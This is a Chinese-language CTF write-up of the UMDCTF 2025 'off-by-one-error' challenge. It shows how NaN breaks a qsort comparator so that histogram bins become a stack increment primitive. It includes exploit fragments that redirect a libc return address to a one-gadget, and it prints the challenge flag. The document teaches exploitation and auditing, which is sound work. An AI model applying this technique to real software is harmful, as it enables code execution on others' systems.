# UMDCTF 2025 - off-by-one-error

## 题目简述

程序读取 10000 个 `float`，排序后按最小值和最大值分到 10 个直方图区间：

```c
int bin = BINS * (data[i] - min) / (max - min);
counts[bin]++;
```

当 `data[i] == max` 时，公式得到 `bin == 10`，已经越过合法下标 `0` 到 `9`。
更严重的是，浮点比较器没有正确处理 NaN，攻击者可以破坏 `qsort` 所需的严格弱序，
让任意大的“区间编号”留在数组中间，最终把一次 off-by-one 扩展成相对栈地址上的
16 位加一原语。

## 解题过程

### 1. 用 NaN 固定 `min = 0`、`max = 10`

比较器如下：

```c
int compare(const void *a, const void *b) {
    return *(float *)a == *(float *)b ? 0
         : *(float *)a > *(float *)b ? 1 : -1;
}
```

对 NaN 而言，相等与大于比较都为假，所以 `compare(a, NaN)` 和
`compare(NaN, a)` 都可能返回 `-1`，排序关系自相矛盾。官方输入先放置：

```python
inp = [
    20100, 20100,
    float("nan"),
    10,
    0, 0,
]
```

在该实现的实际排序结果中，首尾元素被控制为 0 和 10。于是公式简化为：

```text
bin = 10 * (value - 0) / (10 - 0) = value
```

后续每个整数浮点值都直接成为 `counts` 的下标。由于 `counts` 元素是
`short`，`counts[k]++` 会把相对 `counts` 起点偏移 $2k$ 字节处的 16 位数加一。

### 2. 调整栈内容并改写 libc 返回地址

官方脚本根据编译后二进制的栈布局选取以下下标：

```python
for _ in range(128):
    inp.append(16 + 2 * (N - 2) + 1)  # 改掉栈中 NaN 的指数

for _ in range(0x80):
    inp.append(16 + N * 2 + 8)        # 调整 rbp-0x78 约束

for _ in range(diff1):
    inp.append(16 + N * 2 + 20)       # libc 返回地址低 16 位

for _ in range(diff2):
    inp.append(16 + N * 2 + 21)       # libc 返回地址次低 16 位

for _ in range(17):
    inp.append(16 + N * 2 + 12)       # 改为 add rsp, 8; ret
```

第一组增量把参与后续直方图计算的 NaN 位模式调整为有限值，避免转换区间编号时
继续产生异常结果。第二组调整栈指针相关内容，使 one-gadget 的
`rbp - 0x78` 可写约束成立。最后三组分别修正控制流。

提供的 libc 中，`main` 原始返回点偏移为 `0x29d90`，目标 one-gadget 为
`0xebc81`。由于原语只能递增，脚本分别计算两个 16 位半字的正向差值：

```python
cur = 0x29d90
target = 0xebc81

diff1 = (target & 0xffff) - (cur & 0xffff)
diff2 = (target >> 16) - (cur >> 16)
```

同时把 `vuln` 的返回地址低位增加 17，使其落到 `add rsp, 8; ret`，跳过一层栈槽后
使用已经改写的 libc 返回地址。整个过程没有线性覆盖栈帧，因此 Canary 保持原值；
PIE/ASLR 的高位也不必泄漏，只修改同一映射内已知的低位差。触发 one-gadget 后读取：

```text
UMDCTF{one_two_skip_a_few_ninety_nine_NaN_zero_ten_thousand}
```

## 方法总结

本题的关键并不止是最大值落入第 11 个桶，而是 NaN 让错误比较器无法建立有效顺序，
进而保留任意大的桶下标。审计浮点排序与分桶代码时，应同时检查 NaN、无穷、相等值、
最大端点以及浮点到整数的转换。一个看似只能越界一个元素的计数器，只要索引来源可被
扩大，就可能成为覆盖整个栈帧的相对写原语。
